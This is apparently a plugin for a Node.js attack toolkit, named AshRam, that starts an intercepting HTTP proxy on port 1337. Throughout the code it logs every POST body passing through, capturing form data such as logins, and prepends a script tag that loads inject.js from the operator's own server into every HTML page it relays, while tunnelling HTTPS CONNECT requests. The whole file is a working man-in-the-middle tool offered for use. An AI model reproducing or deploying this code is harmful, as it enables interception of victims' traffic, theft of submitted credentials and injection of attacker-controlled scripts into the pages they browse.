this.prefix = 'ashram';
this.call = function(args, mh) {
  var ashramport = 1337;
  if(args.length == 2) {
    var http = mh.require('http');
    var request = mh.require('request');
    var net = mh.require('net');
    var url = mh.require('url');
    var enableDestroy = mh.require('server-destroy');
    if(args[1] == 'enable') {
      if(mh.varRet('ashramproxy')) {
        mh.clog('[AshRam] Proxy already running!'.red)
      } else {
        mh.clog('[AshRam] Starting AshramProxy on port '.green + ashramport.toString().green.bold + '...'.green);
        mh.varAdd('ashramproxy', http.createServer(function (req, res) {
          req.on('error', function() {

          });
          try {
            if(req.method == 'POST') {
              var bodypost = "";
              req.on('data', function (chunk) {
                bodypost += chunk;
              });
              req.on('end', function () {
                mh.clog('[AshRam] Found some post data: '.green + bodypost.toString().blue.bold);
              });
            }
            if(req.headers.accept.search('text/html') != -1) {
              mh.clog('[AshRam] Injecting into: '.green + req.url);
              request.get(req.url, function(err,resget,body){
                res.writeHead(resget.statusCode, resget.headers);
                res.end("<script src='"+ mh.config.ip + ':' + mh.config.webport + "/inject.js'></script>" + body);
              });
            } else {
              req.pause();
              var options = url.parse(req.url);
              options.headers = req.headers;
              options.method = req.method;
              options.agent = false;
              var connector = http.request(options, function(serverResponse) {
                serverResponse.pause();
                res.writeHeader(serverResponse.statusCode, serverResponse.headers);
                serverResponse.pipe(res);
                serverResponse.resume();
              });
              req.pipe(connector);
              req.resume();
            }
          } catch(err) {
            mh.clog('[AshRam] '.red + err.toString().red);
          }
        }));
        mh.varRet('ashramproxy').on('connect', function(req, cltSocket, head) {
          req.on('error', function() {

          });
          try {
            var srvUrl = url.parse(`http://${req.url}`);
            var srvSocket = net.connect(srvUrl.port, srvUrl.hostname, () => {
              cltSocket.write('HTTP/1.1 200 Connection Established\r\n' +
              'Proxy-agent: Node.js-Proxy\r\n' +
              '\r\n');
              srvSocket.write(head);
              srvSocket.pipe(cltSocket);
              cltSocket.pipe(srvSocket);
            });
          } catch(err) {
            mh.clog('[AshRam] '.red + err.red);
          }
        });

        mh.varRet('ashramproxy').listen(ashramport, function () {
          mh.clog('[AshRam] AshramProxy started successfully on port '.green + ashramport.toString().green.bold + '.'.green);
        });
        enableDestroy(mh.varRet('ashramproxy'));
      }
    } else if(args[1] == 'disable') {
      mh.varRet('ashramproxy').unref();
      mh.varRet('ashramproxy').destroy();
      mh.varDel('ashramproxy');
      mh.clog('[AshRam] Closed proxy.'.green);
    } else {
      mh.clog('[AshRam] Invalid arguments!'.red);
    }
  } else {
    mh.clog('[AshRam] Not enough arguments supplied!'.red)
  }
}
